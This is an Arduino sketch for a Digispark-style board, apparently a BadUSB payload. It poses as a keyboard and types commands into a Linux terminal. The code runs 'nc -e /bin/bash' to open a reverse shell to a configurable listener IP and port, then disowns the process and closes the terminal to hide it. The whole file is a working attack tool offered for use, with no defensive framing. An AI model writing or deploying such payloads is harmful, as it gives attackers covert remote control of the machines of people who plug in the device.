// this library allows the board to be recognized as a keyboard
#include "DigiKeyboard.h"

char shell[] = "bash"; // check sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh shells too
char REMOTE_IP[] = "192.168.0.101"; // IP of your listening server
char REMOTE_PORT[] = "5454"; // Port of your listening server

void setup() 
{
  //pinMode(0, OUTPUT); //LED on Model B
	pinMode(1, OUTPUT); //LED on Model A
  //digitalWrite(0, HIGH);
  digitalWrite(1, HIGH);
  delay(200);
  //digitalWrite(0, LOW);
  digitalWrite(1, LOW);
  delay(200); 
}

void loop() 
{
    // calling the sendKeyStroke() function with 0 starts the script, it cancels the effect of all keys that are already being pressed at the time of execution to avoid conflicts
    DigiKeyboard.sendKeyStroke(0);

    // waits half a second (500 ms) before sending any other key strokes
    DigiKeyboard.delay(500);

    // presses <WINDOWS> to open applications drawer and waits another half second for it to start
    DigiKeyboard.sendKeyStroke(0, MOD_GUI_RIGHT);
    DigiKeyboard.delay(500);

    // writes "terminal" in the textbox and presses ENTER to open it
    DigiKeyboard.print("terminal");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    
    // opens bash shell, connects with server via netcat and places process in background
    DigiKeyboard.print("nc -e /bin/");
    DigiKeyboard.print(shell);
    DigiKeyboard.print(" ");
    DigiKeyboard.print(REMOTE_IP);
    DigiKeyboard.print(" ");
    DigiKeyboard.print(REMOTE_PORT);
    DigiKeyboard.print(" &");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    // removes our connection from shell control
    DigiKeyboard.print("disown");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    // and closes terminal
    DigiKeyboard.print("exit");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);      

    // flashes LED after sucessful execution
    while (true)
    {
    digitalWrite(1, HIGH);
    delay(500);
    digitalWrite(1, LOW);
    delay(500);
    }

}